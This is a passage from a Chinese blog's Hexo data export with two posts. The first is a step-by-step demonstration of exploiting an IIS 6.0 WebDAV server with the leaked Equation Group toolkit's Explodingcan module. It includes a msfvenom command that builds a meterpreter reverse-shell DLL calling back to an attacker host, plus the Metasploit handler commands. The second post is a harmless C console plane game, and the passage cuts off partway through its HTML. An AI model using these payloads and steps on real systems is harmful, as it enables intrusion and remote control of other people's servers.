第三步：使用方程式工具包进行攻击\n\n0x01\n\n将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为\"listeningposts\"的文件夹，如图，不然运行会报错\n\n![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg \"5.jpg\")\n\n0x02\n\n打开命令提示符，输入\n```\nC:\\win\\fb.py\n```\n然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图\n\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/1.jpg \"1.jpg\")\n\n最后敲击回车\n\n0x03\n\n显示出`fb >`之后输入命令\n```\nuse Explodingcan\n```\n\n使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可\n\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/2.jpg \"2.jpg\")\n\n（选择系统，CallbackIP、CallbackPort等，端口可以任意设置）\n\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/3.jpg \"3.jpg\")\n\n之后都保存默认配置，攻击成功如图\n\n![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/4.jpg \"4.jpg\")","slug":"post164","published":1,"updated":"2020-12-07T02:06:19.827Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdj001sq0szt4u72ykq","content":"<h3 id=\"验证环境：\"><a href=\"#验证环境：\" class=\"headerlink\" title=\"验证环境：\"></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href=\"https://www.python.org/download/releases/2.6.6/\" target=\"_blank\" rel=\"noopener\">安装python2.6.6</a>, <a href=\"https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/\" target=\"_blank\" rel=\"noopener\">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href=\"https://codeload.github.com/misterch0c/shadowbroker/zip/master\" target=\"_blank\" rel=\"noopener\">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p>\n<p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p>\n<p>目标机1(本次演示IP：172.16.12.3)：开放了80端口的Windows Server 2003 R2，IIS6.0，开启了Webdav功能</p>\n<p>以上所有IP之间均可以直接访问<br><a id=\"more\"></a></p>\n<h3 id=\"验证步骤：\"><a href=\"#验证步骤：\" class=\"headerlink\" title=\"验证步骤：\"></a>验证步骤：</h3><hr>\n<h4 id=\"第一步：生成可执行的恶意dll文件\"><a href=\"#第一步：生成可执行的恶意dll文件\" class=\"headerlink\" title=\"第一步：生成可执行的恶意dll文件\"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01</p>\n<p>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"></p>\n<p>0x02</p>\n<p>执行命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll &gt;s.dll</span><br></pre></td></tr></table></figure></p>\n<p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell</p>\n<p>0x03</p>\n<p>点击xshell如图位置</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg\" alt=\"3.jpg\" title=\"3.jpg\"></p>\n<p>打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg\" alt=\"4.jpg\" title=\"4.jpg\"></p>\n<h4 id=\"第二步：配置kali使得kali处于监听状态\"><a href=\"#第二步：配置kali使得kali处于监听状态\" class=\"headerlink\" title=\"第二步：配置kali使得kali处于监听状态\"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01</p>\n<p>依次输入命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set lhost 172.16.12.2</span><br><span class=\"line\">set lport 5555</span><br><span class=\"line\">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n<p>看到如图即说明配置成功</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg\" alt=\"2.jpg\" title=\"2.jpg\"></p>\n<p>这时就可以将xshell最小化，等后边再用</p>\n<h4 id=\"第三步：使用方程式工具包进行攻击\"><a href=\"#第三步：使用方程式工具包进行攻击\" class=\"headerlink\" title=\"第三步：使用方程式工具包进行攻击\"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01</p>\n<p>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg\" alt=\"5.jpg\" title=\"5.jpg\"></p>\n<p>0x02</p>\n<p>打开命令提示符，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\win\\fb.py</span><br></pre></td></tr></table></figure></p>\n<p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"></p>\n<p>最后敲击回车</p>\n<p>0x03</p>\n<p>显示出<code>fb &gt;</code>之后输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Explodingcan</span><br></pre></td></tr></table></figure></p>\n<p>使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/2.jpg\" alt=\"\" title=\"2.jpg\"></p>\n<p>（选择系统，CallbackIP、CallbackPort等，端口可以任意设置）</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/3.jpg\" alt=\"\" title=\"3.jpg\"></p>\n<p>之后都保存默认配置，攻击成功如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/4.jpg\" alt=\"4.jpg\" title=\"4.jpg\"></p>\n","site":{"data":{}},"excerpt":"<h3 id=\"验证环境：\"><a href=\"#验证环境：\" class=\"headerlink\" title=\"验证环境：\"></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href=\"https://www.python.org/download/releases/2.6.6/\" target=\"_blank\" rel=\"noopener\">安装python2.6.6</a>, <a href=\"https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/\" target=\"_blank\" rel=\"noopener\">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href=\"https://codeload.github.com/misterch0c/shadowbroker/zip/master\" target=\"_blank\" rel=\"noopener\">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p>\n<p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p>\n<p>目标机1(本次演示IP：172.16.12.3)：开放了80端口的Windows Server 2003 R2，IIS6.0，开启了Webdav功能</p>\n<p>以上所有IP之间均可以直接访问<br>","more":"</p>\n<h3 id=\"验证步骤：\"><a href=\"#验证步骤：\" class=\"headerlink\" title=\"验证步骤：\"></a>验证步骤：</h3><hr>\n<h4 id=\"第一步：生成可执行的恶意dll文件\"><a href=\"#第一步：生成可执行的恶意dll文件\" class=\"headerlink\" title=\"第一步：生成可执行的恶意dll文件\"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01</p>\n<p>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"></p>\n<p>0x02</p>\n<p>执行命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll &gt;s.dll</span><br></pre></td></tr></table></figure></p>\n<p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell</p>\n<p>0x03</p>\n<p>点击xshell如图位置</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg\" alt=\"3.jpg\" title=\"3.jpg\"></p>\n<p>打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg\" alt=\"4.jpg\" title=\"4.jpg\"></p>\n<h4 id=\"第二步：配置kali使得kali处于监听状态\"><a href=\"#第二步：配置kali使得kali处于监听状态\" class=\"headerlink\" title=\"第二步：配置kali使得kali处于监听状态\"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01</p>\n<p>依次输入命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set lhost 172.16.12.2</span><br><span class=\"line\">set lport 5555</span><br><span class=\"line\">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n<p>看到如图即说明配置成功</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg\" alt=\"2.jpg\" title=\"2.jpg\"></p>\n<p>这时就可以将xshell最小化，等后边再用</p>\n<h4 id=\"第三步：使用方程式工具包进行攻击\"><a href=\"#第三步：使用方程式工具包进行攻击\" class=\"headerlink\" title=\"第三步：使用方程式工具包进行攻击\"></a>第三步：使用方程式工具包进行攻击</h4><p>0x01</p>\n<p>将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为”listeningposts”的文件夹，如图，不然运行会报错</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg\" alt=\"5.jpg\" title=\"5.jpg\"></p>\n<p>0x02</p>\n<p>打开命令提示符，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\win\\fb.py</span><br></pre></td></tr></table></figure></p>\n<p>然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"></p>\n<p>最后敲击回车</p>\n<p>0x03</p>\n<p>显示出<code>fb &gt;</code>之后输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use Explodingcan</span><br></pre></td></tr></table></figure></p>\n<p>使用该工具，之后除了下图所示位置需要修改，其他都保持默认直接敲击回车即可</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/2.jpg\" alt=\"\" title=\"2.jpg\"></p>\n<p>（选择系统，CallbackIP、CallbackPort等，端口可以任意设置）</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/3.jpg\" alt=\"\" title=\"3.jpg\"></p>\n<p>之后都保存默认配置，攻击成功如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/iis6/4.jpg\" alt=\"4.jpg\" title=\"4.jpg\"></p>"},{"title":"一个不到300行的C语言打飞机游戏","date":"2017-06-17T04:41:59.000Z","_content":"\n### 一个不到300行的C语言打飞机游戏\n<!--more-->\n```c\n#include \"stdio.h\"\n#include <windows.h>\n#include <conio.h>\n#include <time.h>\n#define Esc 27 //退出\n#define Up 72 //上，下，左，右\n#define Down 80\n#define Left 75\n#define Right 77\n#define Kong 32 //发射子弹\n\nint x=10; //飞机坐标\nint y=18;\nint d2=10;//敌机坐标\nint d1=10;\nint d=10;\nint r=1;\nint r1=1;\nint r2=1;\nint t=1; // 游戏结束\nint f=0; // 计分数\nint m=3; // 敌机数\nint j=0; // 歼敌数\nchar p; // 接受按键\nvoid kongzhi(int bx,int by);//声明函数\nvoid huatu();\nvoid gotoxy(int x,int y) //移动坐标\n{\n\tCOORD coord;\n\tcoord.X=x;\n\tcoord.Y=y;\n\tSetConsoleCursorPosition( GetStdHandle( STD_OUTPUT_HANDLE ), coord );\n}\nvoid hidden()//隐藏光标\n{\n\tHANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);\n\tCONSOLE_CURSOR_INFO cci;\n\tGetConsoleCursorInfo(hOut,&cci);\n\tcci.bVisible=0;//赋1为显示，赋0为隐藏\n\tSetConsoleCursorInfo(hOut,&cci);\n}\n\n//说明\nvoid shuoming()\n{\n\tprintf(\"\\t\\t\\t\\n\\n\\n\\n\");\n\tprintf(\"\\t\\t\\t方向控制\\n\\n\"\n\t\t\"\\t\\t\\t上 ↑\\n\\n\"\n\t\t\"\\t\\t\\t下 ↓\\n\\n\"\n\t\t\"\\t\\t\\t左 ←\\n\\n\"\n\t\t\"\\t\\t\\t右 →\\n\\n\"\n\t\t\"\\t\\t\\t子弹 空格\\n\\n\\n\"\n\t\t\"\\t\\t\\t退出请按 ESC\\n\");\n\tgotoxy(0,0);\n}\n\n//判断我机死没死/游戏结束\nvoid byebye()\n{\n\tif((x==d&&y==r)||(x==d1&&y==r1)||(x==d2&&y==r2))\n\t{\n\t\tgotoxy(1,3);\n\t\tprintf(\" !!! 游戏结束 !!!\\n\"\n\t\t\"*******************\\n\"\n\t\t\" 您的总得分: %d\\n\\n\"\n\t\t\" 敌机数: %d\\n\"\n\t\t\" 歼敌数: %d\\n\"\n\t\t\" 命中率: %.0f %%\\n\"\n\t\t\"*******************\\n\",f,m,j,((float)j/(float)m)*100);\n\t\twhile(!kbhit())\n\t\t{\n\t\t\tSleep(500);\n\t\t\tgotoxy(1,12);\n\t\t\tprintf(\" 继续请按任意键...\\n\\n\\n\");\n\t\t\tSleep(900);\n\t\t\tgotoxy(1,12);\n\t\t\tprintf(\" \");\n\t\t}\n\t\tgotoxy(0,0);\n\t\thuatu();\n\t\tf=0; m=0; j=0;\n\t\tif(x>=18) x--;\n\t\telse x++;\n\t\tgotoxy(x,y);\n\t\tprintf(\"Ж\");\n\t}\n}\n\n// 计分/更新敌机\nvoid jifan()\n{\n\tif(x==d&&y==r)\n\t{\n\t\tgotoxy(d,r);\n\t\tprintf(\"3\");\n\tSleep(200);\n\tgotoxy(d,r); printf(\" \"); f+=2; r=0; j++;}\n\tif(x==d1&&y==r1)\n\t{\n\t\tgotoxy(d1,r1);\n\t\tprintf(\"1\");\n\t\tSleep(200);\n\t\tgotoxy(d1,r1);\n\t\tprintf(\" \");\n\t\tf+=3; r1=0; j++;\n\t}\n\tif(x==d2&&y==r2)\n\t{\n\t\tgotoxy(d2,r2);\n\t\tprintf(\"0\");\n\t\tSleep(200);\n\t\tgotoxy(d2,r2);\n\t\tprintf(\" \");\n\t\tf+=1; r2=0; j++;\n\t}\n\tgotoxy(26,2);\n\tprintf(\" %d \\n\",f);\n\n}\n\n//画图\nvoid huatu()\n{\n\tint i,n;\n\tfor(i=0;i<=20;i++)\n\t{\n\t\tfor(n=0;n<=20;n++)\n\t\t{\n\t\t\tprintf(\"*\");\n\t\t}\n\t\tprintf(\"\\n\");\n\t}\n\tfor(i=1;i<=19;i++)\n\t{\n\t\tfor(n=1;n<=19;n++)\n\t\t{\n\t\t\tgotoxy(i,n);\n\t\t\tprintf(\" \");\n\t\t}\n\t}\n}\n\n//随机产生敌机\nvoid dfeiji()\n{\n\twhile(t)\n\t{\n\t\tif(!r) {d=rand()%17+1; m++;}\n\t\tif(!r1) {d1=rand()%17+1; m++;}\n\t\tif(!r2) {d2=rand()%17+1; m++;}\n\t\twhile(t)\n\t\t{\n\t\t\tr++; r1++; r2++;\n\t\t\tgotoxy(d,r);\n\t\t\tprintf(\"Ψ\");\n\t\t\tgotoxy(d1,r1);\n\t\t\tprintf(\"ж\");\n\t\t\tgotoxy(d2,r2);\n\t\t\tprintf(\"♀\");\n\t\t\tSleep(900);\n\t\t\tgotoxy(d,r);\n\t\t\tprintf(\" \");\n\t\t\tgotoxy(d1,r1);\n\t\t\tprintf(\" \");\n\t\t\tgotoxy(d2,r2);\n\t\t\tprintf(\" \");\n\t\t\tkongzhi(0,0);\n\t\t\tbyebye();\n\t\t\tif(r==18) r=0;\n\t\t\tif(r1==18) r1=0;\n\t\t\tif(r2==18) r2=0;\n\t\t\tif(r==0||r1==0||r2==0) break;\n\t\t}\n\t}\n}\n\n//操控飞机\nvoid kongzhi(int bx,int by)\n{\n\tint a;\n\twhile (kbhit())\n\t{\n\t\tif((p=getch())==-32) p=getch();\n\t\ta=p;\n\t\tgotoxy(22,5);\n\t\tswitch(a)\n\t\t{//控制方向\n\t\t\tcase Up:if (y!=1)\n\t\t\t{\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\" \");\n\t\t\t\ty--;\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\"Ж\");\n\t\t\t}break;\n\t\t\tcase Down:if (y!=18)\n\t\t\t{\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\" \");\n\t\t\t\ty++;\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\"Ж\");\n\t\t\t}break;\n\t\t\tcase Left:if (x!=1)\n\t\t\t{\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\" \");\n\t\t\t\tx--;\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\"Ж\");\n\t\t\t}break;\n\t\t\tcase Right:if (x!=18)\n\t\t\t{\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\" \");\n\t\t\t\tx++;\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\"Ж\");\n\t\t\t}break;\n\t\t\tcase Kong:\n\t\t\t{\n\t\t\t\tbx=y;\n\t\t\t\tfor(by=y;by>1;) //发射子弹\n\t\t\t\t{\n\t\t\t\t\tby--;\n\t\t\t\t\tgotoxy(x,by);\n\t\t\t\t\tprintf(\"θ\");\n\t\t\t\t\tSleep(10);\n\t\t\t\t\tgotoxy(x,by);\n\t\t\t\t\tprintf(\" \");\n\t\t\t\t\ty=by;\n\t\t\t\t\tjifan();\n\t\t\t\t\tif(r==0||r1==0||r2==0) break;\n\t\t\t\t}\n\t\t\t\ty=bx;\n\t\t\t}break;\n\t\t\tcase Esc:t=0; break; //退出\n\t\t\tdefault:break;\n\t\t}\n\t}\n}\nvoid main()\n{\n\tsrand(time(NULL));\n\tshuoming();\n\thidden();\n\thuatu();\n\tgotoxy(x,y);\n\tprintf(\"Ж\");\n\tgotoxy(22,2);\n\tprintf(\"分数:\");\n\twhile (t)\n\t{\n\t\tkongzhi(0,0);\n\t\tif(t)\n\t\t\tdfeiji ();\n\t}\n}\n```","source":"_posts/post207.md","raw":"---\ntitle: 一个不到300行的C语言打飞机游戏\ndate: 2017-06-17 12:41:59\ntags: [编程,C]\n---\n\n### 一个不到300行的C语言打飞机游戏\n<!--more-->\n```c\n#include \"stdio.h\"\n#include <windows.h>\n#include <conio.h>\n#include <time.h>\n#define Esc 27 //退出\n#define Up 72 //上，下，左，右\n#define Down 80\n#define Left 75\n#define Right 77\n#define Kong 32 //发射子弹\n\nint x=10; //飞机坐标\nint y=18;\nint d2=10;//敌机坐标\nint d1=10;\nint d=10;\nint r=1;\nint r1=1;\nint r2=1;\nint t=1; // 游戏结束\nint f=0; // 计分数\nint m=3; // 敌机数\nint j=0; // 歼敌数\nchar p; // 接受按键\nvoid kongzhi(int bx,int by);//声明函数\nvoid huatu();\nvoid gotoxy(int x,int y) //移动坐标\n{\n\tCOORD coord;\n\tcoord.X=x;\n\tcoord.Y=y;\n\tSetConsoleCursorPosition( GetStdHandle( STD_OUTPUT_HANDLE ), coord );\n}\nvoid hidden()//隐藏光标\n{\n\tHANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);\n\tCONSOLE_CURSOR_INFO cci;\n\tGetConsoleCursorInfo(hOut,&cci);\n\tcci.bVisible=0;//赋1为显示，赋0为隐藏\n\tSetConsoleCursorInfo(hOut,&cci);\n}\n\n//说明\nvoid shuoming()\n{\n\tprintf(\"\\t\\t\\t\\n\\n\\n\\n\");\n\tprintf(\"\\t\\t\\t方向控制\\n\\n\"\n\t\t\"\\t\\t\\t上 ↑\\n\\n\"\n\t\t\"\\t\\t\\t下 ↓\\n\\n\"\n\t\t\"\\t\\t\\t左 ←\\n\\n\"\n\t\t\"\\t\\t\\t右 →\\n\\n\"\n\t\t\"\\t\\t\\t子弹 空格\\n\\n\\n\"\n\t\t\"\\t\\t\\t退出请按 ESC\\n\");\n\tgotoxy(0,0);\n}\n\n//判断我机死没死/游戏结束\nvoid byebye()\n{\n\tif((x==d&&y==r)||(x==d1&&y==r1)||(x==d2&&y==r2))\n\t{\n\t\tgotoxy(1,3);\n\t\tprintf(\" !!! 游戏结束 !!!\\n\"\n\t\t\"*******************\\n\"\n\t\t\" 您的总得分: %d\\n\\n\"\n\t\t\" 敌机数: %d\\n\"\n\t\t\" 歼敌数: %d\\n\"\n\t\t\" 命中率: %.0f %%\\n\"\n\t\t\"*******************\\n\",f,m,j,((float)j/(float)m)*100);\n\t\twhile(!kbhit())\n\t\t{\n\t\t\tSleep(500);\n\t\t\tgotoxy(1,12);\n\t\t\tprintf(\" 继续请按任意键...\\n\\n\\n\");\n\t\t\tSleep(900);\n\t\t\tgotoxy(1,12);\n\t\t\tprintf(\" \");\n\t\t}\n\t\tgotoxy(0,0);\n\t\thuatu();\n\t\tf=0; m=0; j=0;\n\t\tif(x>=18) x--;\n\t\telse x++;\n\t\tgotoxy(x,y);\n\t\tprintf(\"Ж\");\n\t}\n}\n\n// 计分/更新敌机\nvoid jifan()\n{\n\tif(x==d&&y==r)\n\t{\n\t\tgotoxy(d,r);\n\t\tprintf(\"3\");\n\tSleep(200);\n\tgotoxy(d,r); printf(\" \"); f+=2; r=0; j++;}\n\tif(x==d1&&y==r1)\n\t{\n\t\tgotoxy(d1,r1);\n\t\tprintf(\"1\");\n\t\tSleep(200);\n\t\tgotoxy(d1,r1);\n\t\tprintf(\" \");\n\t\tf+=3; r1=0; j++;\n\t}\n\tif(x==d2&&y==r2)\n\t{\n\t\tgotoxy(d2,r2);\n\t\tprintf(\"0\");\n\t\tSleep(200);\n\t\tgotoxy(d2,r2);\n\t\tprintf(\" \");\n\t\tf+=1; r2=0; j++;\n\t}\n\tgotoxy(26,2);\n\tprintf(\" %d \\n\",f);\n\n}\n\n//画图\nvoid huatu()\n{\n\tint i,n;\n\tfor(i=0;i<=20;i++)\n\t{\n\t\tfor(n=0;n<=20;n++)\n\t\t{\n\t\t\tprintf(\"*\");\n\t\t}\n\t\tprintf(\"\\n\");\n\t}\n\tfor(i=1;i<=19;i++)\n\t{\n\t\tfor(n=1;n<=19;n++)\n\t\t{\n\t\t\tgotoxy(i,n);\n\t\t\tprintf(\" \");\n\t\t}\n\t}\n}\n\n//随机产生敌机\nvoid dfeiji()\n{\n\twhile(t)\n\t{\n\t\tif(!r) {d=rand()%17+1; m++;}\n\t\tif(!r1) {d1=rand()%17+1; m++;}\n\t\tif(!r2) {d2=rand()%17+1; m++;}\n\t\twhile(t)\n\t\t{\n\t\t\tr++; r1++; r2++;\n\t\t\tgotoxy(d,r);\n\t\t\tprintf(\"Ψ\");\n\t\t\tgotoxy(d1,r1);\n\t\t\tprintf(\"ж\");\n\t\t\tgotoxy(d2,r2);\n\t\t\tprintf(\"♀\");\n\t\t\tSleep(900);\n\t\t\tgotoxy(d,r);\n\t\t\tprintf(\" \");\n\t\t\tgotoxy(d1,r1);\n\t\t\tprintf(\" \");\n\t\t\tgotoxy(d2,r2);\n\t\t\tprintf(\" \");\n\t\t\tkongzhi(0,0);\n\t\t\tbyebye();\n\t\t\tif(r==18) r=0;\n\t\t\tif(r1==18) r1=0;\n\t\t\tif(r2==18) r2=0;\n\t\t\tif(r==0||r1==0||r2==0) break;\n\t\t}\n\t}\n}\n\n//操控飞机\nvoid kongzhi(int bx,int by)\n{\n\tint a;\n\twhile (kbhit())\n\t{\n\t\tif((p=getch())==-32) p=getch();\n\t\ta=p;\n\t\tgotoxy(22,5);\n\t\tswitch(a)\n\t\t{//控制方向\n\t\t\tcase Up:if (y!=1)\n\t\t\t{\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\" \");\n\t\t\t\ty--;\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\"Ж\");\n\t\t\t}break;\n\t\t\tcase Down:if (y!=18)\n\t\t\t{\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\" \");\n\t\t\t\ty++;\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\"Ж\");\n\t\t\t}break;\n\t\t\tcase Left:if (x!=1)\n\t\t\t{\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\" \");\n\t\t\t\tx--;\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\"Ж\");\n\t\t\t}break;\n\t\t\tcase Right:if (x!=18)\n\t\t\t{\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\" \");\n\t\t\t\tx++;\n\t\t\t\tgotoxy(x,y);\n\t\t\t\tprintf(\"Ж\");\n\t\t\t}break;\n\t\t\tcase Kong:\n\t\t\t{\n\t\t\t\tbx=y;\n\t\t\t\tfor(by=y;by>1;) //发射子弹\n\t\t\t\t{\n\t\t\t\t\tby--;\n\t\t\t\t\tgotoxy(x,by);\n\t\t\t\t\tprintf(\"θ\");\n\t\t\t\t\tSleep(10);\n\t\t\t\t\tgotoxy(x,by);\n\t\t\t\t\tprintf(\" \");\n\t\t\t\t\ty=by;\n\t\t\t\t\tjifan();\n\t\t\t\t\tif(r==0||r1==0||r2==0) break;\n\t\t\t\t}\n\t\t\t\ty=bx;\n\t\t\t}break;\n\t\t\tcase Esc:t=0; break; //退出\n\t\t\tdefault:break;\n\t\t}\n\t}\n}\nvoid main()\n{\n\tsrand(time(NULL));\n\tshuoming();\n\thidden();\n\thuatu();\n\tgotoxy(x,y);\n\tprintf(\"Ж\");\n\tgotoxy(22,2);\n\tprintf(\"分数:\");\n\twhile (t)\n\t{\n\t\tkongzhi(0,0);\n\t\tif(t)\n\t\t\tdfeiji ();\n\t}\n}\n```","slug":"post207","published":1,"updated":"2020-12-07T02:06:46.273Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdk001uq0szy7xvtw0m","content":"<h3 id=\"一个不到300行的C语言打飞机游戏\"><a href=\"#一个不到300行的C语言打飞机游戏\" class=\"headerlink\" title=\"一个不到300行的C语言打飞机游戏\"></a>一个不到300行的C语言打飞机游戏</h3><a id=\"more\"></a>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span 